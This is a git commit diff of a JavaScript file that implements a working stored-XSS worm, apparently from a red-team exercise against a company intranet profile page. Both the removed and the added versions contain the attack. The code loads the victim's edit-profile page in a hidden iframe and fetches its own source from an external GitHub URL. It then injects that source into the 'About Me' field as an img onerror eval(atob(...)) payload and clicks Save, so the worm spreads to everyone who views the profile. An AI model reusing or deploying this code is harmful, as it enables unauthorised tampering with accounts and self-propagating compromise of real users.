8a6ca82844b846b861b215cf8d4c571af947c06d
Edward J. Zaborowski <edward@thezees.net>
2020-12-02 08:22:59 -0500

    url

--- profile.js
+++ profile.js
@@ -1,50 +1,44 @@
-function run() {
-    function getRndInteger(min, max) {
-        return Math.floor(Math.random() * (max - min + 1) ) + min;
-    }
-    
-    
-    var userProfile = $('<iframe />');
-    var profileHtml = "";
-    var payload = "";
-    var payloadURL = "https://raw.githubusercontent.com/eddiezab/custom-profile/master/profile.js?v" + getRndInteger(6000, 65535) + "=" + getRndInteger(6000, 65535);
-    
-    $.ajax({
-        type: "GET",
-        async: false,
-        url: "https://intranet.ent.cgi.com/pages/EditProfile.aspx",
-        success: function (data) {
-            profileHtml = data;
-        }
-    });
-    
-    $.ajax({
-        type: "GET",
-        async: false,
-        cache: false,
-        url: payloadURL,
-        success: function (data) {
-            payload = btoa(data);
-        }
-    });
-    
-    var temp = $($.parseHTML(profileHtml, null, true));
-    $(temp).appendTo($(userProfile));
-    $(userProfile).appendTo($("body"));
-    
-    setTimeout(function () {
-        var profile_payload = "<p>I support the ATMO Red Team</p><img style='display: none;' src='x' onerror='eval(atob(\"" + payload + "\"));'>";
-        
-        if ($('#txtAboutMe').val().indexOf("onerror") == -1) {
-            $('#txtAboutMe').val($('#txtAboutMe').val() + profile_payload);
-            $(".Profile_Edit_EditProfile_Buttons  .Profile_Edit_LabelClass_Button_Save")[0].click();       
-        } else {
-            //alert("already pwnd");
-        }
-        $(userProfile).empty();
-    }, 1000);
+function getRndInteger(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-if (window.location.href.indexOf('MyProfile.aspx') == -1) {
-    run();
-}
+var userProfile = $('<iframe id="edit_profile" src="https://intranet.ent.cgi.com/pages/EditProfile.aspx" style="display:none" height="0" width="0" />');
+//var userProfile = $('<iframe id="edit_profile" src="//intranet.ent.cgi.com/pages/EditProfile.aspx"  height="600" width="800"/>');
+var profileHtml = "";
+//var payload = "";
+var payloadURL = "https://raw.githubusercontent.com/eddiezab/custom-profile/master/profile.js?v" + getRndInteger(6000, 65535) + "=" + getRndInteger(6000, 65535);
+
+var temp = "";
+
+//$('.ui-main-content-inner').prepend(userProfile);
+$('body').append(userProfile);
+
+setTimeout(function() {
+    if ($("#edit_profile").contents().find("#txtAboutMe").val().indexOf("onerror") == -1) {
+        //console.log("Running worm");
+        $.ajax({
+            type: "GET",
+            //async: false,
+            cache: false,
+            url: payloadURL,
+            success: function (data) {
+                var payload = btoa(data);
+                
+                var profile_payload = $("#edit_profile").contents().find('#txtAboutMe').val() + "<p>I support the ATMO Red Team</p><img style='display: none;' src='x' onerror='eval(atob(\"" + payload + "\"));'>";
+                $("#edit_profile").contents().find('#txtAboutMe').val(profile_payload);     
+                
+                console.log($("#edit_profile").contents().find('#txtAboutMe').val());  
+                
+                setTimeout(function() {
+                    $("#edit_profile").contents().find('#aspnetForm .Profile_Edit_EditProfile_Buttons  .Profile_Edit_LabelClass_Button_Save')[0].click();
+                }, 1000);
+
+                
+
+                
+            }
+        });
+    } else {
+        //console.log("Skipping worm");
+    }
+}, 1000);
